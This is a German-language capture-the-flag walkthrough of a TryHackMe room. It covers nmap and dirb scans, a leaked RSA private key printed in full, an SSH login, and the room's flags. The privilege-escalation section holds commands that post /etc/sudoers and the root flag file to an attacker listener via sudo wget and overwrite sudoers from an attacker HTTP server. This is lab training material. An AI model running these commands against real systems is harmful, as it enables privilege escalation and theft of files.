---
description: https://tryhackme.com/room/wgelctf
---

# ♻️ WgelCTF

## Gegeben

* IP

## Vorgehen

### 1. NMAP-Scan:

{% code overflow="wrap" %}
```
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

### 2. DIRB-Scan

{% code overflow="wrap" fullWidth="false" %}
```
+ http://10.10.197.22/index.html (CODE:200|SIZE:11374)                                                                                                                                                                                         + http://10.10.197.22/server-status (CODE:403|SIZE:277)                                                                                                                                                                                        

==> DIRECTORY: http://10.10.197.22/sitemap/                                                                                                                                                                                                                                                                                                                                                                                                                                                   

---- Entering directory: http://10.10.197.22/sitemap/ ----                                                                                                                                                                                     ==> DIRECTORY: http://10.10.197.22/sitemap/.ssh/                                                                                                                                                                                               ==> DIRECTORY: http://10.10.197.22/sitemap/css/                                                                                                                                                                                                ==> DIRECTORY: http://10.10.197.22/sitemap/fonts/                                                                                                                                                                                              ==> DIRECTORY: http://10.10.197.22/sitemap/images/                                                                                                                                                                                             + http://10.10.197.22/sitemap/index.html (CODE:200|SIZE:21080)                                                                                                                                                                                 ==> DIRECTORY: http://10.10.197.22/sitemap/js/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
```
{% endcode %}

-> Subdirectory /sitemap/.ssh/ enthielt die Datei id\_rsa (ssh private key)

{% code overflow="wrap" %}
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```
{% endcode %}

### 3. SSH-Login

Mit der privaten ssh id\_rsa sollte ein login als user "X" möglich sein?

[https://explainshell.com/explain?cmd=ssh+-i](https://explainshell.com/explain?cmd=ssh+-i) <- ausprobieren ! mit datei unter `~./.ssh/` legen

Ich dachte vielleicht könnte das der rsa-key von root sein.

Nach Betrachtung der Source unter / habe ich den Eintrag "Jessie don't forget to update the website" gefunden. Das deutet auf einen User "jessie" hin.

mit `ssh -i ~/.ssh/id_rsa jessie@$ip` konnte eine Verbindung hergestellt werden.

### 4. lokale Enumeration

User-Flag unter \~/Documents/user\_flag.txt gefunden: `057c67131c3d5e42dd5cd3075b198ff6`

sudo -l liefert&#x20;

{% code overflow="wrap" %}
```
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
{% endcode %}

Durch linpeas.sh wird Angriffsvektor über wget bestätigt

Weitere Dateien mit SUID-Berechtigung durch `find / -perm -u=s -type f 2>/dev/null`

```
/bin/ping6
/bin/ping
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```

### 5. Privilege Escalation \[FAIL]

Root-Shell mit wget(privEsc) über die Datei /etc/sudoers

<pre data-overflow="wrap"><code><strong>#Angreifer
</strong>nc -lvnp 80 > sudoers # lokale sudoers-Datei erstellen (header muss manuell entfernt werden)

#Ziel
sudo wget --post-file=/etc/sudoers &#x3C;ip> &#x3C;port> # post mit datei an ip
</code></pre>



```
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie  ALL=(root) NOPASSWD: /usr/bin/wget
```

Hier den Eintrag von jessie auf `NOPASSWD : ALL` ändern



Danach wieder uploaden mit

<pre data-overflow="wrap"><code><strong>#Angreifer
</strong>python3 -m http.server 1234

#Ziel
sudo wget &#x3C;ip>:port/sudoers -O /etc/sudoers # Datei anfordern und lokal überschreiben
</code></pre>



Danach wechsel auf root mit `su root?? funktioniert nicht`

### 6. Root Flag

Flag konnte durch sudo wget --post-file=/root/root\_flag.txt \<ip> extrahiert werden.

`b1b968b37519ad1daa6408188649263d`

Allerdings konnte keine PrivEsc durchgefüjrt werden, da sudoers nicht validiert werden konnte!

Nochmal probieren!
